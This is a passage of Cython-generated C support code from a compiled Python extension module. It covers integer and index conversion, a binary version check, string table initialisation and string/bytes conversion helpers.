        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[4], rtversion[4];
    PyOS_snprintf(ctversion, 4, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    PyOS_snprintf(rtversion, 4, "%s", Py_GetVersion());
    if (ctversion[0] != rtversion[0] || ctversion[2] != rtversion[2]) {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */
